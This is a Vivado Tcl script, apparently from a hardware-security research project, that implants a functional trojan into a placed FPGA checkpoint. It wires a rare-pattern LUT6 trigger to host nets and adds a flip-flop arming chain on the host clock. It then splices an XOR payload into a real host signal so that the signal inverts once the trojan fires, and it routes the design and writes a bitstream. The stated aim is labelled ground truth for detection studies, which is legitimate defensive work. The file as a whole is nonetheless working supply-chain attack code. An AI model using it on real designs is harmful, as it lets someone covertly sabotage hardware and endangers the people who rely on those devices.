# BLADE-I Phase 0.5C-L3 -- FUNCTIONAL TROJAN on a placed checkpoint.
#
# Closes the standing caveat on every L3 result: the implants so far are
# `tied` (observes nothing) or `tapped` (a dormant shift register that samples
# one host net and drives nothing). This inserts a COMPLETE trojan structure
# into a shipped placed checkpoint, host placement untouched:
#
#   trigger  a LUT6 over 6 real host nets, INIT set so it asserts on ONE input
#            combination (all-ones) -- a rare-pattern trigger, the standard
#            Trust-Hub trigger shape.
#   arming   an N-stage flip-flop shift register on the host clock: stage 0
#            takes the trigger, each stage takes the previous Q, `fire` = last
#            Q. The payload activates only after the pattern persists N cycles,
#            so the trojan is dormant in normal operation.
#   payload  a LUT2 XOR spliced INTO a real host net: the victim load pin is
#            disconnected from its driver and re-driven by XOR(driver, fire).
#            While fire = 0 the host function is bit-identical; when fire = 1
#            the signal inverts. This is the piece no earlier build had -- a
#            cell inserted into an existing path that changes host behaviour.
#
# GROUND TRUTH is constructive, written in l3_eco_implant.tcl's exact format
# (`IMPLANT <cell> <site>` + header), so l3_site_frame_map.py /
# l3_acceptance_bar.py consume it unchanged.
#
# STYLES (argv 6): `trigonly` builds trigger+arming and leaves the payload
# out (de-risk pass: no net splicing); `full` adds the payload splice. The
# splice is the one step no recorded build exercised, so `full` fails LOUDLY
# at the first check that does not hold and reports what it saw.
#
# Every non-splice command is a proven l3_eco_implant.tcl idiom. No
# place_design -seed. Route the whole design, as an attacker starting from the
# shipped placed (unrouted) checkpoint must.
#
# USAGE
#   vivado -mode batch -source l3_functional_implant.tcl -tclargs \
#     <placed_dcp> <outdir> <tag> <slice_range> <n_arm> <style> [route_dir]

set in_dcp   [lindex $argv 0]
set outdir   [lindex $argv 1]
set tag      [lindex $argv 2]
set slice_rg [lindex $argv 3]
set n_arm    [lindex $argv 4]
set style    [lindex $argv 5]
set route_dir [lindex $argv 6]
set n_taps   [lindex $argv 7]
if {$n_arm eq ""}     { set n_arm 8 }
if {$style eq ""}     { set style "full" }
if {$route_dir eq ""} { set route_dir "Default" }
if {$n_taps eq ""}    { set n_taps 6 }
if {$n_taps < 1 || $n_taps > 6} { puts "ERROR: n_taps must be 1..6"; exit 1 }

file mkdir $outdir
file mkdir $outdir/reports
open_checkpoint $in_dcp
puts "=== FUNCTIONAL IMPLANT: tag=$tag style=$style region=$slice_rg arm=$n_arm ==="

# -------------------------------------------------------------- free sites
set free {}
foreach s [get_sites -quiet -filter "NAME =~ SLICE_*" -range $slice_rg] {
    if {[llength [get_cells -quiet -of_objects [get_sites $s]]] == 0} {
        lappend free $s
    }
}
# trigger LUT (1) + arming FFs (n_arm) + payload LUT (1)
set need [expr {$n_arm + 2}]
puts "=== free sites [llength $free], need $need ==="
if {[llength $free] < $need} {
    puts "ERROR: only [llength $free] free sites in $slice_rg, need $need"
    exit 1
}

# -------------------------------------------------------------- power/clock
set clk_net ""
set best 0
foreach n [get_nets -quiet -hier -filter {TYPE == GLOBAL_CLOCK}] {
    set l [llength [get_pins -quiet -of_objects [get_nets $n] -leaf]]
    if {$l > $best} { set best $l ; set clk_net $n }
}
if {$clk_net eq ""} { puts "ERROR: no global clock net" ; exit 1 }
set vcc [lindex [get_nets -quiet -hier -filter {TYPE == POWER}] 0]
set gnd [lindex [get_nets -quiet -hier -filter {TYPE == GROUND}] 0]
if {$vcc eq "" || $gnd eq ""} { puts "ERROR: no VCC/GND net" ; exit 1 }
puts "=== clock: $clk_net ($best pins) ==="

# -------------------------------------------------- trigger input host nets
# Modest-fanout signal nets, the same rule the tapped implant used, so the
# trigger's observation cost is comparable to the tap survey.
set trig_nets {}
foreach n [get_nets -quiet -hier -filter {TYPE == SIGNAL}] {
    set l [llength [get_pins -quiet -of_objects [get_nets $n] -leaf]]
    if {$l >= 2 && $l <= 8} {
        lappend trig_nets $n
        if {[llength $trig_nets] == $n_taps} { break }
    }
}
if {[llength $trig_nets] < $n_taps} {
    puts "ERROR: found only [llength $trig_nets] taggable host nets, need $n_taps"
    exit 1
}
puts "=== trigger taps ([llength $trig_nets]): $trig_nets ==="

set placed {}
set fi 0   ;# free-site index

proc next_site {} {
    global free fi
    set s [lindex $free $fi]
    incr fi
    return $s
}

# -------------------------------------------------------------- trigger LUT
# LUT6 asserting only when all connected inputs are 1: INIT bit (2^k - 1) set,
# where k = number of taps. For 6 taps that is bit 63.
set ntap [llength $trig_nets]
set trig_cell "bladei_ftrig_${tag}"
create_cell -reference LUT6 $trig_cell
# INIT is 64 bits; assert only when all connected inputs are 1, i.e. set the
# single bit at index (2^ntap - 1). Build the 16-nibble hex string directly to
# avoid any large-integer formatting issue.
set hi [expr {(1 << $ntap) - 1}]
set nib [expr {$hi / 4}] ; set bit [expr {$hi % 4}]
set s "" ; for {set i 15} {$i >= 0} {incr i -1} {
    if {$i == $nib} { append s [format %X [expr {1 << $bit}]] } else { append s 0 }
}
set init "64'h$s"
set_property INIT $init [get_cells $trig_cell]
set tsite [next_site]
place_cell $trig_cell ${tsite}/A6LUT
# A LUT has no clock pin -- inputs are wired below.
# Wire the taps to the LUT inputs I0..I(ntap-1); tie unused inputs high.
set trig_out "bladei_ftrig_out_${tag}"
create_net $trig_out
connect_net -hier -net $trig_out -objects [get_pins $trig_cell/O]
for {set i 0} {$i < 6} {incr i} {
    if {$i < $ntap} {
        connect_net -hier -net [lindex $trig_nets $i] \
            -objects [get_pins $trig_cell/I$i]
    } else {
        connect_net -hier -net $vcc -objects [get_pins $trig_cell/I$i]
    }
}
lappend placed "$trig_cell $tsite"
puts "=== trigger LUT placed at $tsite, INIT $init ==="

# -------------------------------------------------------------- arming chain
set prev $trig_out
set last_q ""
for {set i 0} {$i < $n_arm} {incr i} {
    set c "bladei_farm_${tag}_$i"
    create_cell -reference FDRE $c
    set_property INIT 1'b0 [get_cells $c]
    set site [next_site]
    place_cell $c ${site}/AFF
    connect_net -hier -net $clk_net -objects [get_pins $c/C]
    connect_net -hier -net $vcc     -objects [get_pins $c/CE]
    connect_net -hier -net $gnd     -objects [get_pins $c/R]
    connect_net -hier -net $prev    -objects [get_pins $c/D]
    set q "bladei_farm_q_${tag}_$i"
    create_net $q
    connect_net -hier -net $q -objects [get_pins $c/Q]
    set prev $q
    set last_q $q
    lappend placed "$c $site"
}
set fire $last_q
puts "=== arming chain: $n_arm FFs, fire net = $fire ==="

# -------------------------------------------------------------- payload
if {$style eq "full"} {
    # A single-load host signal net that is NOT a trigger tap, so observation
    # and effect are on different signals.
    set victim "" ; set vpin "" ; set vdrv ""
    foreach n [get_nets -quiet -hier -filter {TYPE == SIGNAL}] {
        if {[lsearch -exact $trig_nets $n] >= 0} { continue }
        set loads [get_pins -quiet -of_objects [get_nets $n] -leaf \
                       -filter {DIRECTION == IN}]
        set drvs  [get_pins -quiet -of_objects [get_nets $n] -leaf \
                       -filter {DIRECTION == OUT}]
        if {[llength $loads] == 1 && [llength $drvs] == 1} {
            set victim $n ; set vpin [lindex $loads 0] ; set vdrv [lindex $drvs 0]
            break
        }
    }
    if {$victim eq ""} {
        puts "ERROR: no single-driver single-load host net to splice"; exit 1
    }
    puts "=== payload victim: $victim  driver $vdrv -> load $vpin ==="

    # XOR(victim, fire): INIT 4'h6. While fire=0 the load sees the driver
    # unchanged; fire=1 inverts it.
    set xc "bladei_fpay_${tag}"
    create_cell -reference LUT2 $xc
    set_property INIT 4'h6 [get_cells $xc]
    set xsite [next_site]
    place_cell $xc ${xsite}/B6LUT
    set pout "bladei_fpay_out_${tag}"
    create_net $pout
    # Disconnect the load from the host net, then re-drive it through the XOR.
    # Refetch the net FROM the load pin so the name matches the leaf segment
    # actually on the pin -- disconnecting by a hierarchical alias silently
    # leaves the pin connected and the later re-drive then fails (observed).
    set vnet [get_nets -quiet -of_objects $vpin]
    disconnect_net -net $vnet -objects $vpin
    # Guard: the pin must now be floating before we re-drive it.
    if {[llength [get_nets -quiet -of_objects $vpin]] != 0} {
        puts "ERROR: load pin $vpin still connected after disconnect_net"; exit 1
    }
    connect_net -hier -net $vnet -objects [get_pins $xc/I0]
    connect_net -hier -net $fire -objects [get_pins $xc/I1]
    connect_net -hier -net $pout -objects [get_pins $xc/O]
    connect_net -hier -net $pout -objects $vpin
    lappend placed "$xc $xsite"
    puts "=== payload XOR spliced at $xsite (victim net $vnet) ==="
}

# -------------------------------------------------------------- record + route
set fh [open $outdir/reports/${tag}_implant_truth.txt w]
puts $fh "tag: $tag"
puts $fh "region: $slice_rg"
puts $fh "style: $style"
puts $fh "n_cells: [llength $placed]"
puts $fh "clock_net: $clk_net"
puts $fh "trigger_taps: $trig_nets"
if {$style eq "full"} { puts $fh "payload_victim: $victim" }
foreach p $placed { puts $fh "IMPLANT $p" }
close $fh

puts "=== routing full design, directive $route_dir ==="
route_design -directive $route_dir
report_route_status -file $outdir/reports/${tag}_route_status.rpt
catch {report_timing_summary -file $outdir/reports/${tag}_timing.rpt}
write_checkpoint -force $outdir/${tag}_routed.dcp
write_bitstream -force -logic_location_file $outdir/${tag}.bit
puts "=== FUNCTIONAL IMPLANT DONE: $tag ($style) ==="
